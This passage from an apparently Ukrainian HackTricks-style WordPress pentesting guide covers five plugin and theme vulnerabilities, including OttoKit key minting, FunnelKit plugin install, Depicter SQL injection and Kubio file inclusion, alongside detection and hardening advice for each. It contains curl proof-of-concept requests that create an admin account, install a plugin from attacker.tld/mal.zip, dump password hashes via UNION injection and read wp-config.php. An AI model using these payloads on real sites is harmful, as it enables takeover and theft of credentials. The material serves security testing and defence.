–û—á—ñ–∫—É–≤–∞–Ω—ñ –æ–∑–Ω–∞–∫–∏ —É—Å–ø—ñ—Ö—É

- HTTP 200 –∑ JSON —Ç—ñ–ª–æ–º —è–∫-–æ—Ç {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* –¥–ª—è –ø–æ—Å—Ç—Ä–∞–∂–¥–∞–ª–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞; –ø–æ–¥–∞–ª—å—à—ñ –∑–∞–ø–∏—Ç–∏ —î –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–º–∏.

–ó–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è —ñ–º–µ–Ω—ñ action

- –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ç–µ–º—É/–ø–ª–∞–≥—ñ–Ω –Ω–∞ –Ω–∞—è–≤–Ω—ñ—Å—Ç—å —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ–π add_action('wp_ajax_nopriv_...', '...') –≤ –∫–æ–¥—ñ social login (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, framework/add-ons/social-login/class-social-login.php).
- Grep –Ω–∞ –Ω–∞—è–≤–Ω—ñ—Å—Ç—å wp_set_auth_cookie(), get_user_by('email', ...) –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ AJAX-–æ–±—Ä–æ–±–Ω–∏–∫—ñ–≤.

–ö–æ–Ω—Ç—Ä–æ–ª—å–Ω–∏–π —Å–ø–∏—Å–æ–∫ –≤–∏—è–≤–ª–µ–Ω–Ω—è

- –í–µ–±-–ª–æ–≥–∏, —â–æ –ø–æ–∫–∞–∑—É—é—Ç—å –Ω–µ–∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω—ñ POST-–∑–∞–ø–∏—Ç–∏ –¥–æ /wp-admin/admin-ajax.php –∑ –¥—ñ—î—é social-login —Ç–∞ id=<email>.
- –í—ñ–¥–ø–æ–≤—ñ–¥—ñ 200 —ñ–∑ success JSON –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –ø–µ—Ä–µ–¥ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–º —Ç—Ä–∞—Ñ—ñ–∫–æ–º –∑ —Ç—ñ—î—ó –∂ IP/User-Agent.

–ó–º—ñ—Ü–Ω–µ–Ω–Ω—è –±–µ–∑–ø–µ–∫–∏

- –ù–µ –≤–∏–≤–æ–¥—å—Ç–µ —ñ–¥–µ–Ω—Ç–∏—á–Ω—ñ—Å—Ç—å –∑ –≤—Ö—ñ–¥–Ω–∏—Ö –¥–∞–Ω–∏—Ö –∫–ª—ñ—î–Ω—Ç–∞. –ü—Ä–∏–π–º–∞–π—Ç–µ –ª–∏—à–µ email/ID, —è–∫—ñ –ø–æ—Ö–æ–¥—è—Ç—å –≤—ñ–¥ –≤–∞–ª—ñ–¥–æ–≤–∞–Ω–æ–≥–æ —Ç–æ–∫–µ–Ω–∞/ID –ø—Ä–æ–≤–∞–π–¥–µ—Ä–∞.
- –í–∏–º–∞–≥–∞–π—Ç–µ CSRF nonces —Ç–∞ –ø–µ—Ä–µ–≤—ñ—Ä–æ–∫ capability –Ω–∞–≤—ñ—Ç—å –¥–ª—è –¥–æ–ø–æ–º—ñ–∂–Ω–∏—Ö –ª–æ–≥—ñ–Ω-—Ñ—É–Ω–∫—Ü—ñ–π; —É–Ω–∏–∫–∞–π—Ç–µ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó wp_ajax_nopriv_ —è–∫—â–æ —Ü–µ –Ω–µ —Å—É–≤–æ—Ä–æ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ.
- –í–∞–ª—ñ–¥—É–π—Ç–µ —Ç–∞ –ø–µ—Ä–µ–≤—ñ—Ä—è–π—Ç–µ OAuth/OIDC –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ñ; –≤—ñ–¥—Ö–∏–ª—è–π—Ç–µ –≤—ñ–¥—Å—É—Ç–Ω—ñ—Ö/–Ω–µ–¥—ñ–π—Å–Ω–∏—Ö –ø—Ä–æ–≤–∞–π–¥–µ—Ä—ñ–≤ (–±–µ–∑ fallback –¥–æ POST id).
- –†–æ–∑–≥–ª—è–Ω—å—Ç–µ —Ç–∏–º—á–∞—Å–æ–≤–µ –≤—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è social login –∞–±–æ –≤—ñ—Ä—Ç—É–∞–ª—å–Ω–µ –ø–∞—Ç—á–µ–Ω–Ω—è –Ω–∞ –º–µ–∂—ñ (–±–ª–æ–∫—É–≤–∞–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ—ó –¥—ñ—ó) –¥–æ –≤–∏–ø—Ä–∞–≤–ª–µ–Ω–Ω—è.

–í–∏–ø—Ä–∞–≤–ª–µ–Ω–∞ –ø–æ–≤–µ–¥—ñ–Ω–∫–∞ (Jobmonster 4.8.0)

- –í–∏–¥–∞–ª–µ–Ω–æ –Ω–µ–±–µ–∑–ø–µ—á–Ω–∏–π fallback —ñ–∑ $_POST['id']; $user_email –º–∞—î –ø–æ—Ö–æ–¥–∏—Ç–∏ –∑ –ø–µ—Ä–µ–≤—ñ—Ä–µ–Ω–∏—Ö –≥—ñ–ª–æ–∫ –ø—Ä–æ–≤–∞–π–¥–µ—Ä–∞ –≤ switch($_POST['using']).

## Unauthenticated privilege escalation via REST token/key minting on predictable identity (OttoKit/SureTriggers ‚â§ 1.0.82)

–î–µ—è–∫—ñ –ø–ª–∞–≥—ñ–Ω–∏ –≤—ñ–¥–∫—Ä–∏–≤–∞—é—Ç—å REST-–µ–Ω–¥–ø–æ—ñ–Ω—Ç–∏, —è–∫—ñ –µ–º—ñ—Å—ñ—é—é—Ç—å –ø–æ–≤—Ç–æ—Ä–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–Ω—ñ ‚Äúconnection keys‚Äù –∞–±–æ tokens –±–µ–∑ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ capability –≤–∏–∫–ª–∏–∫–∞—á–∞. –Ø–∫—â–æ –º–∞—Ä—à—Ä—É—Ç –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É—î—Ç—å—Å—è –ª–∏—à–µ –∑–∞ –≤–≥–∞–¥—É–≤–∞–Ω–æ—é –∞—Ç—Ä–∏–±—É—Ç–æ–º (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, username) —ñ –Ω–µ –ø—Ä–∏–≤'—è–∑—É—î –∫–ª—é—á –¥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞/—Å–µ—Å—ñ—ó –∑ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞–º–∏ capability, –±—É–¥—å-—è–∫–∏–π –Ω–µ–∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–π –∞—Ç–∞–∫—É—é—á–∏–π –º–æ–∂–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏ –∫–ª—é—á —ñ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω—ñ –¥—ñ—ó (—Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É admin, –¥—ñ—ó –ø–ª–∞–≥—ñ–Ω—ñ–≤ ‚Üí RCE).

- –í—Ä–∞–∑–ª–∏–≤–∏–π –º–∞—Ä—à—Ä—É—Ç (–ø—Ä–∏–∫–ª–∞–¥): sure-triggers/v1/connection/create-wp-connection
- –ü–æ–º–∏–ª–∫–∞: –ø—Ä–∏–π–º–∞—î username, –≤–∏–¥–∞—î connection key –±–µ–∑ current_user_can() –∞–±–æ —Å—É–≤–æ—Ä–æ–≥–æ permission_callback
- –ù–∞—Å–ª—ñ–¥–æ–∫: –ø–æ–≤–Ω–µ –∑–∞—Ö–æ–ø–ª–µ–Ω–Ω—è —à–ª—è—Ö–æ–º –ø—Ä–∏–≤'—è–∑–∫–∏ –µ–º—ñ—Å–æ–≤–∞–Ω–æ–≥–æ –∫–ª—é—á–∞ –¥–æ –≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ—Ö –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏—Ö –¥—ñ–π

PoC ‚Äì –∑–≥–µ–Ω–µ—Ä—É–π—Ç–µ (mint) connection key —ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–π—Ç–µ –π–æ–≥–æ
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# ‚Üí {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
Why it‚Äôs exploitable
- –ß—É—Ç–ª–∏–≤–∏–π REST route –∑–∞—Ö–∏—â–µ–Ω–∏–π –ª–∏—à–µ –Ω–∏–∑—å–∫–æ–µ–Ω—Ç—Ä–æ–ø—ñ–π–Ω–∏–º –¥–æ–∫–∞–∑–æ–º —ñ–¥–µ–Ω—Ç–∏—á–Ω–æ—Å—Ç—ñ (username) –∞–±–æ –≤—ñ–¥—Å—É—Ç–Ω—ñ–º permission_callback
- –í—ñ–¥—Å—É—Ç–Ω—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞ capability; –∑–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω–∏–π –∫–ª—é—á —Å–ø—Ä–∏–π–º–∞—î—Ç—å—Å—è —è–∫ —É–Ω—ñ–≤–µ—Ä—Å–∞–ª—å–Ω–∏–π –æ–±—Ö—ñ–¥

Detection checklist
- Grep –∫–æ–¥ –ø–ª–∞–≥—ñ–Ω–∞ –Ω–∞ register_rest_route(..., [ 'permission_callback' => '__return_true' ])
- –ë—É–¥—å-—è–∫–∏–π –º–∞—Ä—à—Ä—É—Ç, —â–æ –≤–∏–¥–∞—î tokens/keys –Ω–∞ –æ—Å–Ω–æ–≤—ñ identity, –Ω–∞–¥–∞–Ω–æ—ó –≤ –∑–∞–ø–∏—Ç—ñ (username/email), –±–µ–∑ –ø—Ä–∏–≤'—è–∑–∫–∏ –¥–æ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∞–±–æ capability
- –®—É–∫–∞–π—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω—ñ –º–∞—Ä—à—Ä—É—Ç–∏, —è–∫—ñ –ø—Ä–∏–π–º–∞—é—Ç—å –∑–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω–∏–π token/key –±–µ–∑ —Å–µ—Ä–≤–µ—Ä–Ω–∏—Ö –ø–µ—Ä–µ–≤—ñ—Ä–æ–∫ capability

Hardening
- –î–ª—è –±—É–¥—å-—è–∫–æ–≥–æ –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–æ–≥–æ REST route: –≤–∏–º–∞–≥–∞–π—Ç–µ permission_callback, —è–∫–∏–π –∑–∞—Å—Ç–æ—Å–æ–≤—É—î current_user_can() –¥–ª—è –ø–æ—Ç—Ä—ñ–±–Ω–æ—ó capability
- –ù–µ —Å—Ç–≤–æ—Ä—é–π—Ç–µ –¥–æ–≤–≥–æ—Ç—Ä–∏–≤–∞–ª—ñ keys –Ω–∞ –æ—Å–Ω–æ–≤—ñ identity, –ø–µ—Ä–µ–¥–∞–Ω–æ—ó –∫–ª—ñ—î–Ω—Ç–æ–º; —è–∫—â–æ –ø–æ—Ç—Ä—ñ–±–Ω–æ, –≤–∏–¥–∞–≤–∞–π—Ç–µ –∫–æ—Ä–æ—Ç–∫–æ–∂–∏–≤—É—á—ñ, –ø—Ä–∏–≤'—è–∑–∞–Ω—ñ –¥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ tokens –ø—ñ—Å–ª—è –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó —Ç–∞ –ø–æ–≤—Ç–æ—Ä–Ω–æ –ø–µ—Ä–µ–≤—ñ—Ä—è–π—Ç–µ capability –ø—Ä–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—ñ
- –ü–µ—Ä–µ–≤—ñ—Ä—è–π—Ç–µ –∫–æ–Ω—Ç–µ–∫—Å—Ç –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —è–∫–∏–π –≤–∏–∫–ª–∏–∫–∞—î (wp_set_current_user –Ω–µ–¥–æ—Å—Ç–∞—Ç–Ω—å–æ —Å–∞–º –ø–æ —Å–æ–±—ñ) —ñ –≤—ñ–¥—Ö–∏–ª—è–π—Ç–µ –∑–∞–ø–∏—Ç–∏, –¥–µ !is_user_logged_in() || !current_user_can(<cap>)

---

## –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è Nonce gate ‚Üí –Ω–µ–∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–∞ –¥–æ–≤—ñ–ª—å–Ω–∞ —ñ–Ω—Å—Ç–∞–ª—è—Ü—ñ—è –ø–ª–∞–≥—ñ–Ω–∞ (FunnelKit Automations ‚â§ 3.5.3)

Nonces –∑–∞–ø–æ–±—ñ–≥–∞—é—Ç—å CSRF, –∞ –Ω–µ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó. –Ø–∫—â–æ –∫–æ–¥ —Ç—Ä–∞–∫—Ç—É—î —É—Å–ø—ñ—à–Ω—É –ø–µ—Ä–µ–≤—ñ—Ä–∫—É nonce —è–∫ –∑–µ–ª–µ–Ω–∏–π —Å–∏–≥–Ω–∞–ª —ñ –ø—Ä–æ–ø—É—Å–∫–∞—î –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –ø—Ä–∞–≤ –¥–ª—è –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏—Ö –æ–ø–µ—Ä–∞—Ü—ñ–π (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, install/activate plugins), –Ω–µ–∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω—ñ –∞—Ç–∞–∫—É—é—á—ñ –º–æ–∂—É—Ç—å –∑–∞–¥–æ–≤–æ–ª—å–Ω–∏—Ç–∏ —Å–ª–∞–±–∫—É –≤–∏–º–æ–≥—É nonce —ñ –¥–æ—Å—è–≥—Ç–∏ RCE, –≤—Å—Ç–∞–Ω–æ–≤–∏–≤—à–∏ –ø–ª–∞–≥—ñ–Ω –∑ –±–µ–∫–¥–æ—Ä–æ–º –∞–±–æ —É—Ä–∞–∑–ª–∏–≤–∏–π –ø–ª–∞–≥—ñ–Ω.

- Vulnerable path: plugin/install_and_activate
- –ù–µ–¥–æ–ª—ñ–∫: weak nonce hash check; no current_user_can('install_plugins'|'activate_plugins') once nonce ‚Äúpasses‚Äù
- –ù–∞—Å–ª—ñ–¥–æ–∫: –ø–æ–≤–Ω–µ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞–Ω–Ω—è —á–µ—Ä–µ–∑ –¥–æ–≤—ñ–ª—å–Ω–µ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è/–∞–∫—Ç–∏–≤–∞—Ü—ñ—é –ø–ª–∞–≥—ñ–Ω–∞

PoC (—Ñ–æ—Ä–º–∞ –∑–∞–ª–µ–∂–∏—Ç—å –≤—ñ–¥ –ø–ª–∞–≥—ñ–Ω–∞; –ª–∏—à–µ —ñ–ª—é—Å—Ç—Ä–∞—Ü—ñ—è)
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
–ß–µ–∫–ª—ñ—Å—Ç –≤–∏—è–≤–ª–µ–Ω–Ω—è
- REST/AJAX handlers that modify plugins/themes with only wp_verify_nonce()/check_admin_referer() and no capability check
- Any code path that sets $skip_caps = true after nonce validation

–ó–º—ñ—Ü–Ω–µ–Ω–Ω—è
- –ó–∞–≤–∂–¥–∏ —Ç—Ä–∞–∫—Ç—É–π—Ç–µ nonces —è–∫ CSRF tokens —Ç—ñ–ª—å–∫–∏; –≤–∏–º–∞–≥–∞–π—Ç–µ capability checks –Ω–µ–∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ —Å—Ç–∞–Ω—É nonce
- –í–∏–º–∞–≥–∞–π—Ç–µ current_user_can('install_plugins') —ñ current_user_can('activate_plugins') –ø–µ—Ä–µ–¥ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è–º –∫–æ–¥—É —ñ–Ω—Å—Ç–∞–ª—è—Ç–æ—Ä–∞
- –í—ñ–¥—Ö–∏–ª—è–π—Ç–µ –Ω–µ–∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–∏–π –¥–æ—Å—Ç—É–ø; —É–Ω–∏–∫–∞–π—Ç–µ –µ–∫—Å–ø–æ–Ω—É–≤–∞–Ω–Ω—è nopriv AJAX actions –¥–ª—è –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏—Ö –ø–æ—Ç–æ–∫—ñ–≤

---

## –ù–µ–∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–∏–π SQLi —á–µ—Ä–µ–∑ –ø–∞—Ä–∞–º–µ—Ç—Ä s (search) –≤ –¥—ñ—è—Ö depicter-* (Depicter Slider ‚â§ 3.6.1)

–ö—ñ–ª—å–∫–∞ depicter-* actions –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–ª–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä s (search) —ñ –∫–æ–Ω–∫–∞—Ç–µ–Ω—É–≤–∞–ª–∏ –π–æ–≥–æ –≤ SQL-–∑–∞–ø–∏—Ç–∏ –±–µ–∑ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏–∑–∞—Ü—ñ—ó.

- –ü–∞—Ä–∞–º–µ—Ç—Ä: s (search)
- –í—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å: –ø—Ä—è–º–∞ –∫–æ–Ω–∫–∞—Ç–µ–Ω–∞—Ü—ñ—è —Ä—è–¥–∫–∞ –≤ WHERE/LIKE clauses; no prepared statements/sanitization
- –í–ø–ª–∏–≤: database exfiltration (users, hashes), lateral movement

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
Detection checklist
- –®—É–∫–∞—Ç–∏ (grep) –æ–±—Ä–æ–±–Ω–∏–∫–∏ –¥—ñ–π depicter-* —Ç–∞ –ø—Ä—è–º–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è $_GET['s'] –∞–±–æ $_POST['s'] –≤ SQL
- –ü–µ—Ä–µ–≥–ª—è–Ω—É—Ç–∏ –∫–∞—Å—Ç–æ–º–Ω—ñ –∑–∞–ø–∏—Ç–∏, –ø–µ—Ä–µ–¥–∞–Ω—ñ –≤ $wpdb->get_results()/query(), —è–∫—ñ –∫–æ–Ω–∫–∞—Ç–µ–Ω—É—é—Ç—å s

Hardening
- –ó–∞–≤–∂–¥–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ $wpdb->prepare() –∞–±–æ wpdb-–ø–ª–µ–π—Å—Ö–æ–ª–¥–µ—Ä–∏; –≤—ñ–¥–∫–∏–¥–∞—Ç–∏ –Ω–µ—Å–ø–æ–¥—ñ–≤–∞–Ω—ñ –º–µ—Ç–∞—Å–∏–º–≤–æ–ª–∏ –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ñ
- –î–æ–¥–∞—Ç–∏ —Å—É–≤–æ—Ä–∏–π allowlist –¥–ª—è s —ñ –Ω–æ—Ä–º–∞–ª—ñ–∑—É–≤–∞—Ç–∏ –¥–æ –æ—á—ñ–∫—É–≤–∞–Ω–æ—ó charset/length

---

## Unauthenticated Local File Inclusion via unvalidated template/file path (Kubio AI Page Builder ‚â§ 2.5.1)

–ü—Ä–∏–π–Ω—è—Ç—Ç—è —à–ª—è—Ö—ñ–≤, –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–∏—Ö –∞—Ç–∞–∫—É—é—á–∏–º, —É –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ —à–∞–±–ª–æ–Ω—É –±–µ–∑ –Ω–æ—Ä–º–∞–ª—ñ–∑–∞—Ü—ñ—ó/–æ–±–º–µ–∂–µ–Ω–Ω—è –¥–æ–∑–≤–æ–ª—è—î —á–∏—Ç–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω—ñ –ª–æ–∫–∞–ª—å–Ω—ñ —Ñ–∞–π–ª–∏, –∞ —ñ–Ω–æ–¥—ñ ‚Äî –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –∫–æ–¥, —è–∫—â–æ –≤–∫–ª—é—á–µ–Ω—ñ PHP/–ª–æ–≥-—Ñ–∞–π–ª–∏ –ø–æ—Ç—Ä–∞–ø–ª—è—é—Ç—å —É —Å–µ—Ä–µ–¥–æ–≤–∏—â–µ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è.

- Parameter: __kubio-site-edit-iframe-classic-template
- Flaw: no normalization/allowlisting; traversal permitted
- Impact: secret disclosure (wp-config.php), potential RCE in specific environments (log poisoning, includable PHP)

PoC ‚Äì read wp-config.php
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
–ß–µ–∫–ª—ñ—Å—Ç –≤–∏—è–≤–ª–µ–Ω–Ω—è
- –ë—É–¥—å-—è–∫–∏–π handler, —è–∫–∏–π –∫–æ–Ω–∫–∞—Ç–µ–Ω—É—î —à–ª—è—Ö–∏ –∑–∞–ø–∏—Ç—ñ–≤ —É include()/require()/read sinks –±–µ–∑ –æ–±–º–µ–∂–µ–Ω–Ω—è —á–µ—Ä–µ–∑ realpath()
- –®—É–∫–∞—Ç–∏ –ø–∞—Ç–µ—Ä–Ω–∏ traversal (../), —è–∫—ñ –≤–∏—Ö–æ–¥—è—Ç—å –∑–∞ –º–µ–∂—ñ –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–æ—ó –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—ó templates

–ó–º—ñ—Ü–Ω–µ–Ω–Ω—è
- –ó–∞—Å—Ç–æ—Å–æ–≤—É–≤–∞—Ç–∏ allowlisted templates; –≤–∏—Ä—ñ—à—É–≤–∞—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é realpath() —ñ –≤–∏–º–∞–≥–∞—Ç–∏ str_starts_with(realpath(file), realpath(allowed_base))
- –ù–æ—Ä–º–∞–ª—ñ–∑—É–≤–∞—Ç–∏ –≤—Ö—ñ–¥–Ω—ñ –¥–∞–Ω—ñ; –≤—ñ–¥—Ö–∏–ª—è—Ç–∏ traversal-–ø–æ—Å–ª—ñ–¥–æ–≤–Ω–æ—Å—Ç—ñ —Ç–∞ –∞–±—Å–æ–ª—é—Ç–Ω—ñ —à–ª—è—Ö–∏; –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ sanitize_file_name() –ª–∏—à–µ –¥–ª—è —ñ–º–µ–Ω —Ñ–∞–π–ª—ñ–≤ (–Ω–µ –¥–ª—è –ø–æ–≤–Ω–∏—Ö —à–ª—è—Ö—ñ–≤)


## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset ‚Äì delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ‚â§ 5.6.1 ‚Äì Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation ‚Äì Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025‚Äôs most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) ‚â§ 1.0.82 ‚Äì Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations ‚â§ 3.5.3 ‚Äì Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider ‚â§ 3.6.1 ‚Äì Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder ‚â§ 2.5.1 ‚Äì Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
